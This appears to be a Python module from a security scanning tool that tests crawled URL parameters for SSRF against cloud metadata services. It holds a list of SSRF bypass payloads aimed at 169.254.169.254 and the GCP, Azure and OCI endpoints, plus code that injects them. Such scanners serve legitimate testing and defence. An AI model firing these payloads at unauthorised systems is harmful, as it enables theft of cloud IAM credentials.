"""Cloud Metadata SSRF Detector Module.

Detects Server-Side Request Forgery (SSRF) vulnerabilities that can be pivoted
to steal cloud instance credentials from the metadata service.

WHY THIS MODULE EXISTS (vs. Nuclei):
  Nuclei's SSRF templates are good but static. This module generates a dynamic,
  comprehensive matrix of bypass payloads tailored to the cloud provider
  detected for the target. It also reads parameterized URLs already discovered
  by the crawler/paramspider and tests each one systematically.

CLOUD METADATA SERVICES TARGETED:
  - AWS IMDSv1:   http://169.254.169.254/latest/meta-data/iam/security-credentials/
  - AWS IMDSv2:   Requires X-aws-ec2-metadata-token header (harder but tested)
  - GCP:          http://metadata.google.internal/computeMetadata/v1/
  - Azure:        http://169.254.169.254/metadata/instance?api-version=2021-02-01
  - Oracle Cloud: http://169.254.169.254/opc/v2/instance/

BYPASS TECHNIQUES GENERATED:
  - IP decimal encoding:      http://2130706433/ (127.0.0.1)
  - IP octal encoding:        http://0177.0.0.01/
  - IPv6 loopback:            http://[::1]/
  - DNS rebinding aliases:    http://localtest.me/
  - URL encoding:             http://%31%36%39.%32%35%34.%32%35%34.%32%35%34/
  - Double URL encoding
  - Protocol switching:       dict://, file://, gopher://
  - Cloud-specific aliases:   http://instance-data/ (AWS alias)

WHAT IT SAVES:
  - FindingRecord (CRITICAL) when metadata is successfully accessed
  - FindingRecord (HIGH) when an SSRF parameter is found (even without metadata leak)
"""
from __future__ import annotations

import asyncio
import time
from typing import Any
from urllib.parse import quote, urlencode, urljoin, urlparse

try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False

from reconai.core.database.models import (
    FindingRecord, Severity, Confidence, FindingStatus,
)
from reconai.modules.base import ModuleConfig, ReconModule
from reconai.modules.registry import register_module


# ── Cloud Metadata Endpoints ──────────────────────────────────────────────────

_METADATA_ENDPOINTS: list[dict[str, Any]] = [
    # AWS IMDSv1 — most critical, returns IAM credentials
    {
        "provider": "AWS",
        "path": "/latest/meta-data/iam/security-credentials/",
        "indicators": ["AccessKeyId", "SecretAccessKey", "Token"],
        "severity": Severity.CRITICAL,
        "description": "AWS IMDSv1 IAM credentials endpoint — leaks rotating access keys",
    },
    {
        "provider": "AWS",
        "path": "/latest/meta-data/",
        "indicators": ["ami-id", "instance-id", "hostname", "public-ipv4"],
        "severity": Severity.HIGH,
        "description": "AWS IMDSv1 root metadata endpoint",
    },
    # GCP Metadata Server
    {
        "provider": "GCP",
        "path": "/computeMetadata/v1/?recursive=true",
        "indicators": ["serviceAccounts", "project", "instance", "email"],
        "severity": Severity.CRITICAL,
        "description": "GCP metadata server — leaks project info and service account tokens",
        "extra_headers": {"Metadata-Flavor": "Google"},
    },
    # Azure IMDS
    {
        "provider": "Azure",
        "path": "/metadata/instance?api-version=2021-02-01",
        "indicators": ["subscriptionId", "resourceGroupName", "vmId", "location"],
        "severity": Severity.CRITICAL,
        "description": "Azure IMDS endpoint — leaks subscription and VM metadata",
        "extra_headers": {"Metadata": "true"},
    },
    # Oracle Cloud
    {
        "provider": "OCI",
        "path": "/opc/v2/instance/",
        "indicators": ["compartmentId", "tenancyId", "region"],
        "severity": Severity.HIGH,
        "description": "Oracle Cloud Infrastructure IMDS endpoint",
    },
]

# ── SSRF Bypass Payloads for 169.254.169.254 ─────────────────────────────────

_METADATA_IP_BYPASSES: list[str] = [
    "169.254.169.254",          # Standard
    "http://169.254.169.254",
    "2852039166",               # Decimal encoding of 169.254.169.254
    "0xa9.0xfe.0xa9.0xfe",     # Hex encoding
    "0251.0376.0251.0376",     # Octal encoding
    "169.254.169.254:80",
    "[::ffff:169.254.169.254]", # IPv4-mapped IPv6
    "169.254.169.254%09",       # Tab bypass
    "169.254.169.254%20",       # Space bypass
    "169.254.169.254%00",       # Null byte bypass
    "169.254.169.254#@example.com",  # Fragment bypass
    "localtest.me",             # DNS resolves to 127.0.0.1
    "0.0.0.0",                  # Some configs treat 0.0.0.0 as loopback
    "[::]",                     # IPv6 all-zeros
    "localhost",                # Basic loopback
    "127.0.0.1",                # Loopback
    "::1",                      # IPv6 loopback
    "metadata.google.internal", # GCP alias
    "instance-data",            # AWS alias
    "169.254.169.254.xip.io",   # Wildcard DNS bypass
    "169.254.169.254.nip.io",   # Another wildcard DNS service
]

# Common URL parameters that may be vulnerable to SSRF
_SSRF_PARAM_NAMES = [
    "url", "uri", "src", "source", "dest", "destination", "redirect",
    "redirect_uri", "redirect_url", "callback", "return", "returnUrl",
    "next", "target", "path", "host", "fetch", "proxy", "request",
    "link", "load", "page", "file", "document", "img", "image", "open",
    "data", "feed", "endpoint", "webhook", "goto", "window", "out",
    "api_url", "api_endpoint", "base_url", "download",
]


@register_module
class MetadataSSRFModule(ReconModule):
    config = ModuleConfig(
        name="metadata_ssrf",
        category="cloud",
        description=(
            "Cloud Metadata SSRF Detector — tests parameterized URLs for SSRF "
            "that can steal AWS/GCP/Azure instance credentials."
        ),
        supports_timeout=True,
    )

    async def run(self, **kwargs: Any) -> Any:
        if not HAS_HTTPX:
            self.logger.error(
                "httpx not installed. Run: pip install httpx",
                module=self.config.name,
            )
            return

        # Get all URLs with parameters from DB
        all_urls = self.db.get_urls(self.scan_id)
        candidate_urls = [
            r["url"] for r in all_urls
            if "?" in r.get("url", "") and r.get("status_code") in (200, 301, 302, 400, 500)
        ]

        if not candidate_urls:
            self.logger.debug(
                "[CLOUD] No parameterized URLs found. Run crawler/paramspider first.",
                module=self.config.name,
            )
            return

        start = time.monotonic()
        self.logger.module_start(
            self.config.name,
            target=f"{len(candidate_urls)} parameterized URLs",
        )

        semaphore = asyncio.Semaphore(5)  # Conservative — avoid hammering the target
        async with httpx.AsyncClient(
            timeout=httpx.Timeout(10.0, connect=5.0),
            follow_redirects=False,
            verify=False,
        ) as client:
            tasks = [
                self._test_url_for_ssrf(client, semaphore, url)
                for url in candidate_urls[:100]  # Cap at 100 to avoid excessive requests
            ]
            await asyncio.gather(*tasks, return_exceptions=True)

        duration = time.monotonic() - start
        self.logger.module_complete(self.config.name, duration=duration)

    async def _test_url_for_ssrf(
        self,
        client: httpx.AsyncClient,
        semaphore: asyncio.Semaphore,
        url: str,
    ) -> None:
        """Test a URL's parameters for SSRF → Cloud Metadata access."""
        parsed = urlparse(url)
        if not parsed.query:
            return

        params = dict(p.split("=", 1) for p in parsed.query.split("&") if "=" in p)
        ssrf_params = [p for p in params if p.lower() in _SSRF_PARAM_NAMES]

        if not ssrf_params:
            return

        async with semaphore:
            for param in ssrf_params:
                for bypass in _METADATA_IP_BYPASSES[:8]:  # Test top 8 bypasses per param
                    for endpoint_def in _METADATA_ENDPOINTS:
                        await self._probe_ssrf(
                            client=client,
                            base_url=url,
                            param=param,
                            bypass=bypass,
                            endpoint_def=endpoint_def,
                        )
                        # Small delay to avoid hammering the target
                        await asyncio.sleep(0.2)

    async def _probe_ssrf(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        param: str,
        bypass: str,
        endpoint_def: dict[str, Any],
    ) -> None:
        """Fire a single SSRF probe and analyse the response."""
        metadata_path = endpoint_def["path"]
        payload = f"http://{bypass}{metadata_path}"

        # Inject our SSRF payload into the parameter
        parsed = urlparse(base_url)
        params = dict(p.split("=", 1) for p in parsed.query.split("&") if "=" in p)
        params[param] = payload
        new_query = "&".join(f"{k}={quote(str(v), safe='')}" for k, v in params.items())
        probe_url = parsed._replace(query=new_query).geturl()

        extra_headers = endpoint_def.get("extra_headers", {})
        try:
            resp = await client.get(probe_url, headers=extra_headers)
            body = resp.text
        except Exception:
            return

        # Check if any of the metadata indicators appear in the response
        indicators = endpoint_def["indicators"]
        found_indicators = [ind for ind in indicators if ind in body]

        if not found_indicators:
            return

        # ── HIT! We got metadata back ────────────────────────────────────
        provider = endpoint_def["provider"]
        severity = endpoint_def["severity"]

        self.logger.info(
            f"[CLOUD] 🔥 SSRF → {provider} METADATA LEAK! "
            f"Param: {param}, Bypass: {bypass}, Indicators: {found_indicators}",
            module=self.config.name,
        )

        # Truncate body for evidence (first 500 chars)
        evidence_snippet = body[:500].replace("\n", " ").strip()

        finding = FindingRecord(
            scan_id=self.scan_id,
            title=f"SSRF → {provider} Cloud Metadata Credential Leak at {urlparse(base_url).netloc}",
            severity=severity,
            confidence=Confidence.VERIFIED,
            status=FindingStatus.VERIFIED,
            affected_asset=base_url,
            affected_asset_type="url_parameter",
            description=(
                f"The '{param}' parameter at '{base_url}' is vulnerable to Server-Side "
                f"Request Forgery (SSRF). The server fetched the {provider} cloud metadata "
                f"endpoint ({metadata_path}) and returned its contents in the response.\n\n"
                f"Provider: {provider}\nEndpoint: {endpoint_def['description']}\n"
                f"Bypass technique used: {bypass}"
            ),
            impact=(
                f"Full {provider} cloud credential theft. "
                "On AWS: IAM role credentials (AccessKeyId + SecretAccessKey + SessionToken) "
                "allow full programmatic access to all AWS services the EC2 role has permissions for. "
                "On GCP/Azure: equivalent service account / managed identity token theft."
            ),
            evidence=f"Response contained indicators: {found_indicators}. Snippet: {evidence_snippet}",
            detection_method=f"SSRF probe with {provider} metadata bypass: {bypass}",
            remediation=(
                "1. Implement an allowlist for outbound server-side requests — reject RFC-1918 and "
                "link-local (169.254.0.0/16) address ranges.\n"
                "2. For AWS: Upgrade to IMDSv2 (token-required mode) which prevents unauthenticated "
                "metadata access even from SSRF.\n"
                "3. For GCP: Use VPC Service Controls to restrict metadata server access.\n"
                "4. Sanitize and validate all URL parameters before server-side fetching."
            ),
            references=[
                "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
                "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html",
                "https://portswigger.net/web-security/ssrf",
            ],
            what_is_it=(
                "SSRF is a vulnerability where an attacker tricks the server into making "
                "HTTP requests to unintended destinations — in this case, the cloud "
                "infrastructure's internal credential service."
            ),
            why_detected=f"Parameter '{param}' accepted a URL payload and the server made an outbound request to the cloud metadata service.",
            attack_class="Server-Side Request Forgery (SSRF) → Cloud Credential Theft",
            conditions_required="The application must make server-side HTTP requests based on user-controlled input, and the cloud instance must have an IAM role/service account attached.",
            safe_verification=(
                f"In a controlled test environment, send:\n"
                f"GET {probe_url}\n"
                f"Check if the response contains: {', '.join(indicators)}"
            ),
            prevention=(
                "Enforce IMDSv2 on all EC2 instances. Block outbound requests to 169.254.169.254 "
                "at the application level and via host-based firewall rules."
            ),
        )
        self.db.insert_finding(finding)
